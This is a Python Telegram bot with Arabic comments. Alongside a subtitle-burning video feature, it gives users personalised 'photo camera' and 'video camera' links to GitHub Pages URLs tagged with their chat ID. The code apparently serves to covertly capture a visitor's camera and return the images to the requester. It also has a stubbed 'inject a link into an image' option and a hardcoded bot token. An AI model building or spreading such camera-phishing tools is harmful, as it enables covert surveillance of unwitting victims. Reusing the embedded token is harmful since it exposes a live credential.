import os
import subprocess
import telebot
from telebot import types
from threading import Thread

# ضع توكن البوت الخاص بك هنا
BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc"
bot = telebot.TeleBot(BOT_TOKEN)

# متغيّر لتخزين حالة المستخدم (إذا كان البوت ينتظر منه إرسال فيديو أو رابط)
user_states = {}

# 1. الرسالة الترحيبية والأزرار الخمسة الرسمية بالأسفل فقط
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\n"
        "الرجاء اختيار الخدمة المطلوبة من الأزرار بالأسفل 👇"
    )
    
    # تنظيف أي كيبورد قديم معلق في الشاشة
    clean_old_markup = types.ReplyKeyboardRemove(selective=False)
    temp_msg = bot.send_message(message.chat.id, "🔄 جاري تحديث الواجهة...", reply_markup=clean_old_markup)
    bot.delete_message(message.chat.id, temp_msg.message_id)
    
    # إنشاء لوحة التحكم السفلية بـ 5 أزرار متناسقة
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_translate = types.KeyboardButton("🎬 قسم ترجمة الفيديوهات")
    btn_image_cam = types.KeyboardButton("🖼️ طلب رابط كاميرا الصور")
    btn_video_cam = types.KeyboardButton("🎥 طلب رابط كاميرا الفيديو")
    btn_inject = types.KeyboardButton("🔒 حقن رابط في صورة")
    btn_audio = types.KeyboardButton("🎧 قسم الصوتيات")
    
    # ترتيب الأزرار لتبدو مريحة ومنظمة
    markup.add(btn_translate)
    markup.add(btn_image_cam, btn_video_cam)
    markup.add(btn_inject, btn_audio)
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

# 2. الاستجابة عند الضغط على الأزرار السفلية النصية
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_text_buttons(message):
    chat_id = message.chat.id
    
    if message.text == "🎬 قسم ترجمة الفيديوهات":
        user_states[chat_id] = "waiting_for_video"
        bot.send_message(chat_id, "📥 **مرحباً بك في قسم الترجمة السحابية!**\nالرجاء إرسال ملف الفيديو (MP4) الآن ليتم حرقه وترجمته فوراً.", parse_mode="Markdown")
        
    elif message.text == "🖼️ طلب رابط كاميرا الصور":
        bot.send_message(chat_id, f"🔗 رابط كاميرا الصور الخاص بك:\n`https://app-display.github.io/ca.html-chatld-/?chatId={chat_id}`", parse_mode="Markdown")
        
    elif message.text == "🎥 طلب رابط كاميرا الفيديو":
        bot.send_message(chat_id, f"🔗 رابط كاميرا الفيديو الخاص بك:\n`https://app-display.github.io/ca.html-chatId/?chatId={chat_id}`", parse_mode="Markdown")
        
    elif message.text == "🔒 حقن رابط في صورة":
        bot.send_message(chat_id, "🔒 هذه الميزة قيد التطوير أو يمكنك إرسال الصورة مباشرة المرة القادمة لحقنها.")
        
    elif message.text == "🎧 قسم الصوتيات":
        bot.send_message(chat_id, "🎧 مرحباً بك في قسم الصوتيات، أرسل الفويس لحفظه تلقائياً.")

# 3. دالة تحميل الفيديو وحرق الترجمة في الخلفية دون تجميد البوت
def process_video_and_burn_subtitles(chat_id, file_id):
    input_filename = f"input_{chat_id}.mp4"
    output_filename = f"output_{chat_id}.mp4"
    status_msg = None
    
    try:
        status_msg = bot.send_message(chat_id, "⚡ **جاري سحب الفيديو سحابياً بأمان... يرجى الانتظار**", parse_mode="Markdown")
        
        file_info = bot.get_file(file_id)
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        # تحميل مستقر على أجزاء صغيرة لمنع الـ Timeout
        import requests
        with requests.get(download_url, stream=True) as r:
            r.raise_for_status()
            with open(input_filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
                    
        bot.edit_message_text("🎬 **اكتمل التحميل! جاري الآن حرق الترجمة عبر نظام FFmpeg السحابي...**", chat_id, status_msg.message_id, parse_mode="Markdown")
        
        # أمر FFmpeg لدمج وحرق الترجمة
        cmd = [
            'ffmpeg', '-y', 
            '-i', input_filename, 
            '-vf', "subtitles=subtitles.srt:force_style='FontSize=16,PrimaryColour=&H00FFFFFF'", 
            '-c:a', 'copy', 
            output_filename
        ]
        
        subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if os.path.exists(output_filename) and os.path.getsize(output_filename) > 0:
            with open(output_filename, 'rb') as video_to_send:
                bot.send_video(chat_id, video_to_send, caption="🎉 تم إنتاج الفيديو وحرق الترجمة بنجاح كالأفلام الاحترافية عبر ريلوي!")
            bot.delete_message(chat_id, status_msg.message_id)
        else:
            bot.edit_message_text("❌ حدث خطأ أثناء معالجة وحرق الترجمة داخل نظام FFmpeg، تأكد من وجود ملف `subtitles.srt`.", chat_id, status_msg.message_id)
            
    except Exception as e:
        if status_msg:
            bot.edit_message_text(f"❌ خطأ غير متوقع:\n`{str(e)}`", chat_id, status_msg.message_id, parse_mode="Markdown")
            
    finally:
        # تنظيف السيرفر
        if os.path.exists(input_filename): os.remove(input_filename)
        if os.path.exists(output_filename): os.remove(output_filename)

# 4. استقبال الفيديوهات فقط عندما يكون المستخدم داخل "قسم الترجمة"
@bot.message_handler(content_types=['video'])
def handle_incoming_video(message):
    chat_id = message.chat.id
    
    # التأكد أن المستخدم ضغط أولاً على زر الترجمة لكي لا تتداخل الوظائف
    if user_states.get(chat_id) == "waiting_for_video":
        user_states[chat_id] = None  # تصفير الحالة
        bot.send_message(chat_id, "⏳ تم استقبال الفيديو بنجاح! جاري البدء في المعالجة...")
        
        # معالجة في Thread مستقل لمنع تعليق البوت
        worker = Thread(target=process_video_and_burn_subtitles, args=(chat_id, message.video.file_id))
        worker.start()
    else:
        bot.reply_to(message, "⚠️ من فضلك اضغط على زر **🎬 قسم ترجمة الفيديوهات** أولاً قبل إرسال الفيديو الخاص بك.", parse_mode="Markdown")

# تشغيل البوت المستمر
if __name__ == '__main__':
    print("⚡ البوت الشامل يعمل الآن بكفاءة وبأزرار منظمة...")
    bot.infinity_polling()
